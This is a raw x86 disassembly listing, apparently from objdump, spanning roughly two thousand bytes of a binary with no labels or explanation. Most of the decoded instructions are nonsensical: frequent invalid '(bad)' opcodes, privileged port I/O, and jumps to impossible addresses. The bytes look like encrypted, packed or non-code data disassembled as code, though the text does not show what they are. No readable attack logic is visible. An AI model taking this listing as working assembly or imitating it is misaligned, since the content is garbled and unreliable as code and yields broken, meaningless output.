  404762:	retf   0xf1f2
  404765:	mov    ebp,0xdadcb9d8
  40476a:	rol    ebx,cl
  40476c:	shl    al,cl
  40476e:	add    eax,edx
  404770:	add    DWORD PTR [ebx],eax
  404772:	(bad)  
  404774:	retf   
  404775:	in     al,0xf3
  404777:	fcmovnu st,st(2)
  404779:	out    0xca,eax
  40477b:	rol    al,cl
  40477d:	shl    ebx,0xb3
  404780:	mov    bl,0xec
  404782:	(bad)  
  404783:	mov    ah,0xac
  404785:	retf   
  404786:	fdivr  st(0),st
  404788:	lock div cl
  40478b:	repnz cli 
  40478d:	xlat   BYTE PTR ds:[ebx]
  40478e:	or     eax,DWORD PTR ds:0xfefcd0fb
  404794:	out    0x2,al
  404796:	aam    0xfc
  404798:	in     eax,dx
  404799:	out    dx,al
  40479a:	(bad)  
  40479c:	leave  
  40479d:	iret   
  40479e:	sti    
  40479f:	in     eax,dx
  4047a0:	mov    ch,0xf9
  4047a2:	retf   
  4047a3:	mov    edx,0xddd3b7f5
  4047a8:	add    eax,edi
  4047aa:	(bad)  
  4047ab:	ret    
  4047ac:	mov    ebp,0xd10be3ff
  4047b1:	fild   WORD PTR [edx]
  4047b3:	or     edx,ebp
  4047b5:	fiadd  WORD PTR [edi]
  4047b7:	(bad)  
  4047b9:	ror    ebp,cl
  4047bb:	test   al,0xea
  4047bd:	retf   0xb5c2
  4047c0:	retf   0xb9b7
  4047c3:	mov    cl,0xb7
  4047c5:	mov    ebx,0xbdeecbf1
  4047ca:	in     al,dx
  4047cb:	add    cl,al
  4047cd:	lock fprem1 
  4047d0:	fiadd  DWORD PTR [eax]
  4047d2:	cld    
  4047d3:	cld    
  4047d4:	add    edi,esp
  4047d6:	adc    ecx,eax
  4047d8:	stc    
  4047d9:	jmp    0xedf2f8aa
  4047de:	in     eax,0xcf
  4047e0:	icebp  
  4047e1:	mov    dh,0xb8
  4047e3:	int3   
  4047e4:	(bad)  
  4047e5:	sar    BYTE PTR [esi-0x46320442],cl
  4047eb:	fdivp  st(7),st
  4047ed:	pop    es
  4047ee:	add    al,0xfb
  4047f0:	jmp    0x4047c3
  4047f2:	(bad)  
  4047f4:	push   cs
  4047f5:	std    
  4047f6:	or     edx,ebx
  4047f8:	leave  
  4047f9:	fisubr WORD PTR [edx-0x23395238]
  4047ff:	shr    ch,cl
  404801:	aam    0xd8
  404803:	fcmovnu st,st(0)
  404805:	in     al,0xd0
  404807:	add    edi,DWORD PTR [ebx-0x2b201f25]
  40480d:	add    eax,edx
  40480f:	cmc    
  404810:	(bad)  
  404812:	mov    esi,0xcee3dfdb
  404817:	out    0xb,al
  404819:	leave  
  40481a:	jmp    0xf832f9ce
  40481f:	fcmovbe st,st(2)
  404821:	int3   
  404822:	loopne 0x4047ff
  404824:	int    0xdf
  404826:	mov    eax,0xf2e8fab1
  40482b:	int3   
  40482c:	fcmovnu st,st(0)
  40482e:	or     esp,eax
  404830:	(bad)  
  404831:	stc    
  404832:	aam    0xe2
  404834:	in     eax,dx
  404835:	in     al,0xc9
  404837:	out    dx,eax
  404838:	adc    DWORD PTR [ecx-0xf5b3643],ebp
  40483e:	leave  
  40483f:	lods   eax,DWORD PTR ds:[esi]
  404840:	out    0xd8,al
  404842:	scas   al,BYTE PTR es:[edi]
  404843:	aam    0xf7
  404845:	in     al,dx
  404846:	in     al,0xfb
  404848:	icebp  
  404849:	mov    ecx,0xe4edfdd3
  40484e:	aad    0xf4
  404850:	add    eax,0xe802def1
  404855:	ret    
  404856:	in     al,dx
  404857:	loopne 0x404842
  404859:	out    dx,eax
  40485a:	shl    bh,cl
  40485c:	into   
  40485d:	into   
  40485e:	lock ret 0xb1f5
  404862:	mov    ebx,0xfefff7e9
  404867:	fcomip st,st(6)
  404869:	inc    DWORD PTR [edi]
  40486b:	(bad)  
  40486d:	std    
  40486e:	(bad)  
  404870:	mov    eax,0xdffae2e6
  404875:	call   0xae092166
  40487a:	out    dx,eax
  40487b:	ret    0xc0d1
  40487e:	fsubr  st(6),st
  404880:	in     al,0xb4
  404882:	mov    ebx,0xc4d5fbd8
  404887:	fsubr  st,st(6)
  404889:	out    dx,al
  40488a:	mov    dh,0x1
  40488c:	rcr    ebp,cl
  40488e:	add    eax,DWORD PTR [edi]
  404890:	cmc    
  404891:	ret    0xb02
  404894:	(bad)  
  404896:	jmp    0xcd0e1476
  40489b:	fbld   TBYTE PTR [edx+edx*8-0x4c302911]
  4048a2:	jmp    0xedcc:0xc9b7bbe5
  4048a9:	rol    DWORD PTR [edx],0xec
  4048ac:	loope  0x404869
  4048ae:	test   bh,0xe9
  4048b1:	cld    
  4048b2:	add    bh,bl
  4048b4:	(bad)  
  4048b5:	int    0xfd
  4048b7:	add    edi,ecx
  4048b9:	test   eax,0xeebec3c1
  4048be:	in     eax,dx
  4048bf:	rcl    ebx,1
  4048c1:	enter  0xfeb0,0xea
  4048c5:	in     eax,0xce
  4048c7:	iret   
  4048c8:	fadd   QWORD PTR [edx]
  4048ca:	mul    dh
  4048cc:	repz cmc 
  4048ce:	out    0xfd,eax
  4048d0:	in     eax,0xf6
  4048d2:	or     eax,esp
  4048d4:	or     DWORD PTR [esi],eax
  4048d6:	fcmovb st,st(1)
  4048d8:	iret   
  4048d9:	mov    ecx,0xebe2d0f1
  4048de:	lods   al,BYTE PTR ds:[esi]
  4048df:	iret   
  4048e0:	mov    dl,0xba
  4048e2:	int3   
  4048e3:	in     eax,0xd5
  4048e5:	(bad)  
  4048e7:	add    edx,esi
  4048e9:	add    ebp,ecx
  4048eb:	iret   
  4048ec:	mov    eax,0xfe05dbc5
  4048f1:	retf   
  4048f2:	add    ch,cl
  4048f4:	loope  0x4048f4
  4048f6:	in     al,dx
  4048f7:	loope  0x4048fe
  4048f9:	jecxz  0x4048be
  4048fb:	ret    0xf2f7
  4048fe:	mov    cl,0xb3
  404900:	fldlg2 
  404902:	(bad)
  404905:	fmul   st,st(0)
  404907:	rcl    dh,cl
  404909:	(bad)  
  40490b:	loope  0x4048da
  40490d:	add    BYTE PTR [esi],al
  40490f:	hlt    
  404910:	rcl    ebp,1
  404912:	retf   0xbe4
  404915:	std    
  404916:	add    ecx,esp
  404918:	enter  0xc4d9,0xe3
  40491c:	scas   al,BYTE PTR es:[edi]
  40491d:	lods   eax,DWORD PTR ds:[esi]
  40491e:	loop   0x40490a
  404920:	cli    
  404921:	clc    
  404922:	sar    BYTE PTR [edx-0x37084050],1
  404928:	fptan  
  40492a:	push   eax
  40492c:	(bad)  
  40492d:	idiv   DWORD PTR [edx+0x4fd07d5]
  404933:	cld    
  404934:	fucomip st,st(0)
  404936:	jmp    0xce1e4737
  40493b:	retf   0xcedc
  40493e:	into   
  40493f:	loop   0x404934
  404941:	fldcw  WORD PTR [esi-0x14002c33]
  404947:	loop   0x40490c
  404949:	int3   
  40494a:	enter  0xdbe1,0xd1
  40494e:	(bad)  
  404950:	cld    
  404951:	or     ebp,edi
  404953:	add    bl,cl
  404955:	jmp    0xe8c7:0xf000fcc2
  40495c:	ret    
  40495d:	mul    ch
  40495f:	cli    
  404960:	out    0xd4,al
  404962:	repz out 0xf3,al
  404965:	lock mov ah,0xf8
  404968:	mov    esi,0xdaecddd2
  40496d:	(bad)  
  40496e:	repz loop 0x40495c
  404971:	jmp    0xc9c9:0xef09dec8
  404978:	jecxz  0x404947
  40497a:	fsubp  st(4),st
  40497c:	mov    esi,0xc4b3adab
  404981:	xlat   BYTE PTR ds:[ebx]
  404982:	repnz ror edi,1
  404985:	cld    
  404986:	fdivrp st(5),st
  404988:	fadd   st(1),st
  40498a:	loope  0x40498e
  40498c:	not    dh
  40498e:	shl    bl,cl
  404990:	jmp    0x40498d
  404992:	aam    0xc4
  404994:	iret   
  404995:	or     ah,dh
  404997:	stc    
  404998:	adc    ebx,esp
  40499a:	mov    edi,0xe4b2acb7
  40499f:	shr    BYTE PTR [ebp+esi*8-0x49210a3a],0xd7
  4049a7:	cld    
  4049a8:	ror    ah,cl
  4049aa:	(bad)  
  4049ac:	(bad)  
  4049ad:	hlt    
  4049ae:	hlt    
  4049af:	repnz rcl dh,0x3
  4049b3:	(bad)
  4049b6:	cli    
  4049b7:	sti    
  4049b8:	sar    BYTE PTR [esi-0xb171d50],cl
  4049be:	mov    bl,0xe5
  4049c0:	stc    
  4049c1:	in     eax,0xd0
  4049c3:	jmp    0xd5240274
  4049c8:	add    ebp,ebp
  4049ca:	sar    DWORD PTR [esi+esi*8-0x470dfe10],0xe9
  4049d2:	or     cl,BYTE PTR [edx]
  4049d4:	jmp    0x4049d5
  4049d6:	add    ebp,ecx
  4049d8:	in     eax,dx
  4049d9:	ret    
  4049da:	mov    esi,0xcfacece1
  4049df:	icebp  
  4049e0:	enter  0xc4f1,0xd3
  4049e4:	out    dx,al
  4049e5:	idiv   esi
  4049e7:	shl    ch,1
  4049e9:	div    bl
  4049eb:	add    DWORD PTR [eax-0x3cfc3d06],edi
  4049f1:	std    
  4049f2:	jmp    0x4049b4
  4049f4:	enter  0xcbfe,0x4
  4049f8:	add    ebx,esp
  4049fa:	mov    cl,0xb1
  4049fd:	out    0xc7,al
  4049ff:	repz int 0xea
  404a02:	mov    edx,0xc9ebc5e4
  404a07:	clc    
  404a08:	iret   
  404a09:	mov    ebp,0xe5eefed2
  404a0e:	out    0xe7,al
  404a10:	neg    ebp
  404a12:	stc    
  404a13:	std    
  404a14:	iret   
  404a15:	ret    
  404a16:	cld    
  404a17:	out    0xc8,al
  404a19:	test   eax,0xb5edbef7
  404a1e:	div    edi
  404a20:	jmp    0xf318361e
  404a25:	dec    dh
  404a27:	into   
  404a28:	add    ecx,edx
  404a2a:	stc    
  404a2b:	out    0xbc,eax
  404a2d:	out    0xd3,eax
  404a2f:	loop   0x404a38
  404a31:	shl    ebx,1
  404a33:	mov    ebp,0x50a03e4
  404a38:	shr    dl,cl
  404a3a:	int    0xf1
  404a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a3d:	leave  
  404a3e:	icebp  
  404a3f:	repz in eax,0xb4
  404a42:	in     al,dx
  404a43:	jmp    0xdafe2103
  404a48:	not    al
  404a4a:	pop    es
  404a4b:	icebp  
  404a4c:	shl    bl,0xdf
  404a4f:	jmp    0xc5ca:0xe3c9f6c1
  404a56:	loope  0x404a2b
  404a58:	add    al,dl
  404a5a:	loopne 0x404a3f
  404a5c:	into   
  404a5d:	mov    al,0xe5
  404a5f:	iret   
  404a60:	ret    0xe8e0
  404a63:	(bad)  
  404a64:	mov    bh,0xd3
  404a66:	mov    dl,0xdd
  404a68:	out    dx,eax
  404a69:	enter  0xfbb8,0x1
  404a6d:	fcomip st,st(7)
  404a6f:	rcl    dh,0xdd
  404a72:	sti    
  404a73:	out    dx,eax
  404a74:	enter  0xc5fa,0xdf
  404a78:	out    0xdf,eax
  404a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a7c:	div    DWORD PTR [eax-0xf4c3653]
  404a82:	in     al,0xcc
  404a84:	xlat   BYTE PTR ds:[ebx]
  404a85:	mov    ecx,0xf3cdf3
  404a8a:	repnz in eax,dx
  404a8c:	mov    esi,0xc7e502bc
  404a91:	lock xlat BYTE PTR ds:[ebx]
  404a93:	fsin   
  404a95:	jmp    0x404a63
  404a97:	loope  0x404a73
  404a99:	mov    esp,0xf0adc6e0
  404a9e:	call   0xc92b0588
  404aa3:	out    dx,al
  404aa4:	shl    ch,cl
  404aa6:	aad    0xbb
  404aa8:	stc    
  404aa9:	jecxz  0x404a7a
  404aab:	repnz fcmovu st,st(1)
  404aae:	(bad)  
  404aaf:	xlat   BYTE PTR ds:[ebx]
  404ab0:	sti    
  404ab1:	add    dh,bl
  404ab3:	stc    
  404ab4:	std    
  404ab5:	fimul  DWORD PTR [eax]
  404ab7:	out    dx,al
  404ab8:	clc    
  404ab9:	into   
  404aba:	mov    cl,0xf6
  404abc:	out    0xb6,al
  404abe:	mov    cl,0xb3
  404ac0:	cli    
  404ac1:	(bad)
  404ac4:	shl    ebp,1
  404ac6:	fsubr  st(3),st
  404ac8:	mov    ecx,0xd701ddbb
  404acd:	jecxz  0x404aa0
  404acf:	div    ah
  404ad1:	loope  0x404ab2
  404ad3:	test   BYTE PTR [edx],0xdd
  404ad6:	push   es
  404ad7:	enter  0xbccc,0xe4
  404adb:	rcl    ecx,cl
  404add:	aad    0xc1
  404adf:	out    dx,al
  404ae0:	leave  
  404ae1:	in     eax,0xb0
  404ae3:	cmc    
  404ae4:	mov    edx,0xf3cfb4f5
  404ae9:	(bad)  
  404aea:	(bad)  
  404aec:	fst    st(4)
  404aee:	rcl    ebx,0xc5
  404af1:	jmp    esp
  404af3:	in     al,0xe
  404af5:	xbegin 0xc7fd33ca
  404afb:	mov    al,0xe7
  404afd:	rol    esp,1
  404aff:	ret    
  404b00:	mov    al,0xf0
  404b02:	(bad)  
  404b03:	clc    
  404b04:	mov    edx,0xd5f2ebbb
  404b09:	jecxz  0x404b03
  404b0b:	in     eax,dx
  404b0c:	cmc    
  404b0d:	rol    DWORD PTR [ebx],cl
  404b0f:	(bad)  
  404b11:	pop    es
  404b12:	or     cl,BYTE PTR [ecx]
  404b14:	or     eax,ebp
  404b16:	loop   0x404b27
  404b18:	or     eax,0xb6c5c6ae
  404b1d:	loopne 0x404ae3
  404b1f:	imul   ebx
  404b21:	aad    0xdb
  404b23:	out    0xce,al
  404b25:	dec    esp
  404b27:	mov    cl,0x2
  404b29:	in     al,dx
  404b2a:	out    0xce,eax
  404b2c:	add    eax,0xd1c5bdc2
  404b31:	leave  
  404b32:	lock loopne 0x404b36
  404b35:	enter  0xc500,0x4
  404b39:	out    dx,al
  404b3a:	mov    bl,0xc8
  404b3c:	int    0xb1
  404b3e:	mov    dl,0xc1
  404b40:	lds    esi,FWORD PTR [ebp-0x1019082c]
  404b46:	int3   
  404b47:	fcomp  st(7)
  404b49:	jecxz  0x404b4b
  404b4b:	xlat   BYTE PTR ds:[ebx]
  404b4c:	out    dx,al
  404b4d:	rol    dh,1
  404b4f:	ret    0xc7c6
  404b52:	or     edi,esp
  404b54:	add    bl,ch
  404b56:	jmp    0xaee81e46
  404b5b:	test   al,0xf3
  404b5d:	call   0xe9383444
  404b62:	in     eax,0xad
  404b64:	repz repz sti 
  404b67:	out    dx,al
  404b68:	dec    eax
  404b6a:	stc    
  404b6b:	cmc    
  404b6c:	(bad)  
  404b6e:	xlat   BYTE PTR ds:[ebx]
  404b6f:	rol    DWORD PTR [edi],1
  404b71:	call   0xf63e444c
  404b76:	retf   0xe3e3
  404b79:	scas   al,BYTE PTR es:[edi]
  404b7a:	sar    BYTE PTR [esi-0x124b292d],1
  404b80:	jmp    0x404b6f
  404b82:	mov    cl,0xc5
  404b84:	hlt    
  404b85:	jmp    0xd1fa2b44
  404b8a:	lock iret 
  404b8c:	sar    DWORD PTR [esi-0x2338282c],1
  404b92:	cli    
  404b93:	(bad)  
  404b95:	fst    QWORD PTR [ebx]
  404b97:	or     al,0x2
  404b99:	enter  0xede1,0xce
  404b9d:	hlt    
  404b9e:	jecxz  0x404b52
  404ba0:	aad    0xd3
  404ba2:	fmul   st,st(1)
  404ba4:	aad    0xd4
  404ba6:	(bad)  
  404ba7:	clc    
  404ba8:	sti    
  404ba9:	repnz neg esp
  404bac:	mov    esi,0x502c3cd
  404bb1:	fucomip st,st(1)
  404bb3:	leave  
  404bb4:	out    dx,al
  404bb5:	(bad)  
  404bb6:	in     eax,0x12
  404bb8:	ffreep st(0)
  404bba:	shr    ebx,1
  404bbc:	leave  
  404bbd:	mov    esp,0xe4f7eeee
  404bc2:	cli    
  404bc3:	retf   0xffbb
  404bc6:	in     al,dx
  404bc7:	jecxz  0x404bbd
  404bc9:	std    
  404bca:	into   
  404bcb:	loope  0x404b9b
  404bcd:	push   es
  404bce:	mov    esp,0x6c406f2
  404bd3:	hlt    
  404bd4:	bswap  esi
  404bd6:	into   
  404bd7:	cld    
  404bd8:	add    ch,BYTE PTR [ecx-0x2a3c3c56]
  404bde:	loop   0x404bbb
  404be0:	out    0xc0,al
  404be2:	in     al,dx
  404be3:	jmp    0xdd0509d5
  404be8:	add    bl,dh
  404bea:	ret    
  404beb:	(bad)  
  404bed:	cli    
  404bee:	add    ch,dh
  404bf0:	loope  0x404bf2
  404bf2:	add    al,0x3
  404bf4:	test   bh,0x3
  404bf7:	in     al,dx
  404bf8:	cld    
  404bf9:	shl    bh,1
  404bfb:	shr    eax,cl
  404bfd:	ret    
  404bfe:	in     eax,0xf1
  404c00:	(bad)  
  404c02:	(bad)  
  404c03:	in     al,dx
  404c04:	in     eax,0xeb
  404c06:	mov    ch,0xd6
  404c08:	fld    DWORD PTR [eax]
  404c0a:	repz mov ebp,0xdbf0bce3
  404c10:	sti    
  404c11:	add    al,0xfd
  404c13:	clc    
  404c14:	stc    
  404c15:	loope  0x404be3
  404c17:	add    ebx,ecx
  404c19:	(bad)  
  404c1a:	jmp    0xcc1403fe
  404c1f:	test   eax,0xccdae8e7
  404c24:	mov    ebx,0xdccdf5d1
  404c29:	mov    ecx,0xd5cdd801
  404c2e:	std    
  404c2f:	sti    
  404c30:	(bad)  
  404c31:	ret    
  404c32:	(bad)  
  404c33:	out    0xe6,al
  404c35:	hlt    
  404c36:	fcmovne st,st(1)
  404c38:	adc    bh,BYTE PTR [ebp+ebp*8-0x4a52284e]
  404c3f:	int    0xd4
  404c41:	rcr    ebx,cl
  404c43:	(bad)  
  404c44:	mov    ebx,0xe2b8bce4
  404c49:	jecxz  0x404c01
  404c4b:	int    0xfe
  404c4d:	jecxz  0x404c30
  404c4f:	add    bl,bh
  404c51:	xlat   BYTE PTR ds:[ebx]
  404c52:	enter  0xd4d8,0xfb
  404c56:	enter  0xc8ca,0xc5
  404c5a:	shl    cl,0xf1
  404c5d:	fmul   st(0),st
  404c5f:	into   
  404c60:	shr    edi,1
  404c62:	out    0xfb,al
  404c64:	mov    al,0xce
  404c66:	enter  0xd9f3,0xbc
  404c6a:	xlat   BYTE PTR ds:[ebx]
  404c6b:	ret    0xc7e5
  404c6e:	loopne 0x404c51
  404c70:	shr    eax,1
  404c72:	(bad)  
  404c74:	(bad)  
  404c75:	loope  0x404c75
  404c77:	adc    al,al
  404c79:	mov    dl,0xea
  404c7b:	out    dx,eax
  404c7c:	mov    esp,0xc6b1caec
  404c81:	jmp    0xf840227d
  404c86:	idiv   DWORD PTR [esp+esi*8-0x71f3f08]
  404c8d:	fyl2x  
  404c8f:	fcmovnu st,st(2)
  404c91:	in     al,0xf4
  404c93:	dec    edx
  404c95:	fsubr  st,st(7)
  404c97:	lds    ecx,FWORD PTR [ebx]
  404c99:	jmp    0x404c59
  404c9b:	loop   0x404c82
  404c9d:	aad    0xc2
  404c9f:	mov    ah,0xd7
  404ca1:	in     eax,dx
  404ca2:	leave  
  404ca3:	(bad)  
  404ca4:	lock mov dh,0xfa
  404ca7:	cmc    
  404ca8:	icebp  
  404ca9:	in     eax,dx
  404caa:	fsubp  st(6),st
  404cac:	out    0xbd,al
  404cae:	mov    esp,0xe0e9e0e0
  404cb3:	out    0xe4,eax
  404cb5:	in     eax,dx
  404cb6:	jmp    0xd2fe50b8
  404cbb:	enter  0xf4e6,0xd3
  404cbf:	lods   eax,DWORD PTR ds:[esi]
  404cc0:	(bad)  
  404cc1:	mov    ecx,0xf8bbf9cc
  404cc6:	repz mov eax,0xf4fcd1b4
  404ccc:	int3   
  404ccd:	fdivr  QWORD PTR [esi-0x3171e2a]
  404cd3:	aam    0xdc
  404cd5:	in     eax,0xe7
  404cd7:	pop    es
  404cd8:	(bad)  
  404cd9:	(bad)
  404cdc:	scas   eax,DWORD PTR es:[edi]
  404cdd:	in     eax,0xf0
  404cdf:	out    dx,al
  404ce0:	repnz mov dl,0xf7
  404ce3:	out    dx,eax
  404ce4:	out    0xc4,al
  404ce6:	fmulp  st(6),st
  404ce8:	loope  0x404cca
  404cea:	aad    0xe6
  404cec:	sar    BYTE PTR [ecx+eiz*8+0x6dffac5],cl
  404cf3:	jmp    0xb222707
  404cf8:	adc    dh,bl
  404cfa:	repnz fst st(0)
  404cfd:	mov    dh,0xdb
  404cff:	jmp    0xf1ed:0xffe7eccc
  404d06:	sar    BYTE PTR [ecx-0x2b09083d],1
  404d0c:	jecxz  0x404cce
  404d0e:	add    al,bl
  404d10:	out    0xd8,al
  404d12:	std    
  404d13:	add    al,ch
  404d15:	fdivp  st(3),st
  404d17:	(bad)  
  404d19:	shl    ch,1
  404d1b:	icebp  
  404d1c:	ror    ch,1
  404d1e:	shr    ebp,1
  404d20:	mov    ch,0xcb
  404d22:	cli    
  404d23:	fistp  QWORD PTR [edi+0x2eecefb]
  404d29:	mov    ebp,0xd5dcb5be
  404d2e:	cld    
  404d2f:	retf   
  404d30:	(bad)  
  404d31:	(bad)  
  404d32:	fcmovnbe st,st(6)
  404d34:	iret   
  404d35:	or     BYTE PTR [ecx],al
  404d37:	into   
  404d38:	fld    st(2)
  404d3a:	lock test eax,0xf1b0d0ae
  404d40:	mov    cl,0xc7
  404d42:	in     al,dx
  404d43:	int    0xb4
  404d45:	retf   
  404d46:	div    BYTE PTR [esi+edi*4-0x40c0e3f]
  404d4d:	ret    
  404d4e:	fadd   QWORD PTR ds:0xfefe0003
  404d54:	retf   0xcdcb
  404d57:	cli    
  404d58:	std    
  404d59:	fnstsw WORD PTR [ebp-0x350d1c5b]
  404d5f:	repz test al,0xf9
  404d62:	mov    cl,0xed
  404d64:	lods   al,BYTE PTR ds:[esi]
  404d65:	mov    eax,0xb7cfd7e4
  404d6a:	icebp  
  404d6b:	(bad)  
  404d6d:	fiadd  DWORD PTR [esi]
  404d6f:	(bad)
  404d72:	cli    
  404d73:	leave  
  404d74:	stc    
  404d75:	(bad)  
  404d76:	into   
  404d77:	or     eax,0xb2dee8d2
  404d7c:	in     al,0xf7
  404d7e:	aam    0xb0
  404d80:	cli    
  404d81:	ror    eax,0xe7
  404d84:	stc    
  404d85:	(bad)  
  404d86:	jmp    0xb718235c
  404d8b:	cld    
  404d8c:	push   ebx
  404d8e:	shl    edx,cl
  404d90:	clc    
  404d91:	(bad)  
  404d92:	fdiv   st(5),st
  404d94:	push   cs
  404d95:	loope  0x404da4
  404d97:	(bad)  
  404d99:	rol    edi,1
  404d9b:	into   
  404d9c:	jmp    0xca0b3787
  404da1:	enter  0xf4c0,0xec
  404da5:	lock jecxz 0x404da5
  404da8:	jmp    0xe5e2:0xbef1ef
  404daf:	sti    
  404db0:	std    
  404db1:	jecxz  0x404d97
  404db3:	retf   0xe3e9
  404db6:	fstp   st(1)
  404db8:	retf   0xdfc5
  404dbb:	out    dx,eax
  404dbc:	aad    0xe1
  404dbe:	test   edi,0xb5f0d6c6
  404dc4:	mov    ecx,0xefe8b5ba
  404dc9:	rol    cl,cl
  404dcb:	mov    ecx,0xc2bae0f3
  404dd0:	out    0xc9,eax
  404dd2:	stc    
  404dd3:	(bad)
  404dd6:	in     eax,dx
  404dd7:	int3   
  404dd8:	out    dx,al
  404dd9:	retf   
  404dda:	mov    dl,0xf2
  404ddc:	aad    0xe6
  404dde:	mov    dl,0xd2
  404de0:	in     al,dx
  404de1:	leave  
  404de2:	clc    
  404de3:	iret   
  404de4:	rcl    edi,cl
  404de6:	mov    ebp,0xdfb8cff7
  404deb:	mov    esi,0xf6dc07ec
  404df0:	cmc    
  404df1:	fmul   DWORD PTR [edi]
  404df3:	out    dx,al
  404df4:	add    al,0xdb
  404df6:	(bad)  
  404df7:	sti    
  404df8:	or     eax,0xb3b3eaa9
  404dfd:	mov    ebp,0xeeb2e6e2
  404e02:	leave  
  404e03:	into   
  404e04:	fidivr WORD PTR [ebp-0x13111c34]
  404e0a:	repz repnz out dx,al
  404e0d:	loope  0x404dd0
  404e0f:	icebp  
  404e10:	cld    
  404e11:	ror    bl,1
  404e13:	jmp    0x404e19
  404e15:	or     ch,bh
  404e17:	jecxz  0x404dfe
  404e19:	call   0xf40d15c4
  404e1e:	out    0xf3,al
  404e20:	mul    al
  404e22:	scas   al,BYTE PTR es:[edi]
  404e23:	call   0xd23229dc
  404e28:	fld    DWORD PTR [ebx]
  404e2a:	std    
  404e2b:	loopne 0x404df4
  404e2d:	rol    esi,1
  404e2f:	fst    st(5)
  404e31:	jecxz  0x404df9
  404e33:	(bad)
  404e36:	fmul   st,st(3)
  404e38:	jmp    0x404e24
  404e3a:	mov    cl,0xe6
  404e3c:	mov    cl,0xe1
  404e3e:	fcmovnb st,st(2)
  404e40:	repz (bad) 
  404e42:	mov    al,0xc4
  404e44:	retf   0xbbde
  404e47:	sar    BYTE PTR [edx-0x13104204],1
  404e4d:	in     eax,dx
  404e4e:	sti    
  404e4f:	(bad)  
  404e50:	rcl    esi,1
  404e52:	out    0xeb,al
  404e54:	mul    ch
  404e56:	clc    
  404e57:	sar    esi,0xc8
  404e5a:	rol    eax,1
  404e5c:	retf   0xcbac
  404e5f:	repz iret 
  404e61:	mov    dh,0xdb
  404e63:	jmp    0x404e29
  404e65:	(bad)
  404e68:	mov    al,0x1
  404e6a:	loopne 0x404e5e
  404e6c:	loope  0x404e67
  404e6e:	loopne 0x404e45
  404e70:	lock retf 
  404e72:	stc    
  404e73:	add    BYTE PTR ds:0xdfe6fa01,al
  404e79:	ret    0xe9ad
  404e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e7d:	xlat   BYTE PTR ds:[ebx]
  404e7e:	jmp    0xd1f4:0xcee8d4f7
  404e85:	mov    esi,0xf1e8ebd1
  404e8a:	enter  0xc3cf,0xd1
  404e8e:	loopne 0x404e70
  404e90:	add    al,0xdc
  404e92:	stc    
  404e93:	mov    ebp,0xceecebf6
  404e98:	bswap  esi
  404e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9b:	loope  0x404e7b
  404e9d:	aad    0xe2
  404e9f:	(bad)  
  404ea1:	icebp  
  404ea2:	retf   0xdbf5
  404ea5:	idiv   DWORD PTR [esi-0x4fc2246]
  404eab:	rol    bh,cl
  404ead:	mov    esp,0xd7fafad0
  404eb2:	cmc    
  404eb3:	aad    0x8
  404eb5:	enter  0xf3e1,0xfa
  404eb9:	in     al,0xcb
  404ebb:	mov    ebp,0xd2eef7bd
  404ec0:	(bad)  
  404ec1:	enter  0xd4ea,0xd7
  404ec5:	mov    bh,0xd9
  404ec7:	sar    DWORD PTR [ebp-0x400a112d],cl
  404ecd:	mov    esi,0xfbf8f2c1
  404ed2:	loopne 0x404ea3
  404ed4:	out    0xf8,al
  404ed6:	leave  
  404ed7:	add    al,ch
  404ed9:	jecxz  0x404ea6
  404edb:	mov    bl,0xec
  404edd:	xlat   BYTE PTR ds:[ebx]
  404ede:	aad    0xf5
  404ee0:	cmc    
  404ee1:	mov    bl,0xba
  404ee3:	ror    esi,cl
  404ee5:	fdivr  st(4),st
  404ee7:	rol    BYTE PTR [ecx],1
  404ee9:	out    dx,eax
  404eea:	not    ecx
  404eec:	out    0xbb,eax
  404eee:	idiv   cl
  404ef0:	cmc    
  404ef1:	(bad)  
  404ef2:	fcmovne st,st(2)
  404ef4:	hlt    
  404ef5:	in     al,0xfe
  404ef7:	in     al,0xcd
  404ef9:	int3   
  404efa:	mov    esp,0xd4d6bcbf
  404eff:	mov    ah,0xa8
  404f01:	in     al,0xb2
  404f03:	jmp    FWORD PTR [edx+edx*8-0x631fc07]
  404f0a:	fcomp  st(0)
  404f0c:	sar    ah,1
  404f0e:	loop   0x404ef4
  404f10:	or     dh,bh
  404f12:	out    0xc8,al
  404f14:	fild   WORD PTR [eax]
  404f16:	push   cs
  404f17:	repnz add eax,ebp
  404f1a:	out    dx,al
  404f1b:	lods   eax,DWORD PTR ds:[esi]
  404f1c:	ror    bl,0xaa
  404f1f:	aad    0xeb
  404f21:	lock (bad) 
  404f23:	repz std 
  404f25:	fst    st(4)
  404f27:	sar    bh,cl
  404f29:	(bad)  
  404f2b:	mov    ch,0xb4
  404f2d:	aam    0xec
  404f2f:	add    eax,0xeff904fc
  404f34:	in     eax,0x9
  404f36:	or     ebx,edi
  404f38:	(bad)  
  404f3a:	shr    esi,cl
  404f3c:	(bad)  
  404f3d:	imul   esi
  404f3f:	lock repnz int 0xea
  404f43:	xlat   BYTE PTR ds:[ebx]
  404f44:	repnz repz mov ah,0xfd
  404f48:	sti    
  404f49:	loop   0x404f0b
  404f4b:	mov    esp,0xf0dae2d6
  404f50:	(bad)  
  404f51:	fdivr  st,st(7)
  404f53:	fcom   st(6)
  404f55:	add    ch,dl
  404f57:	jmp    0xbff00128
  404f5c:	in     eax,dx
  404f5d:	mov    al,0xd1
  404f5f:	loope  0x404f43
  404f61:	hlt    
  404f62:	mov    dh,0xd7
  404f64:	mov    eax,0xf1b5e8cb
  404f69:	fstp   TBYTE PTR [ebp-0x191e3c2d]
  404f6f:	hlt    
  404f70:	fld    st(0)
  404f72:	psubsw mm0,QWORD PTR [ebx]
  404f75:	loopne 0x404f8a
  404f77:	add    ah,ch
  404f79:	rol    eax,0xdc
  404f7c:	out    0xd5,eax
  404f7e:	loopne 0x404f6e
  404f80:	cmc    
  404f81:	in     al,0xb4
  404f83:	mov    edx,0xf3cedcce
  404f88:	cmc    
  404f89:	fninit 
  404f8b:	(bad)  
  404f8c:	push   es
  404f8d:	fadd   st(4),st
  404f8f:	mul    dl
  404f91:	jecxz  0x404f9d
  404f93:	in     al,0xfe
  404f95:	aad    0x8
  404f97:	std    
  404f98:	loop   0x404f49
  404f9a:	ror    esp,cl
  404f9c:	mov    esp,0xb1d5b4d4
  404fa1:	int3   
  404fa2:	repnz rcl esp,1
  404fa5:	stc    
  404fa6:	cmc    
  404fa7:	aam    0xe9
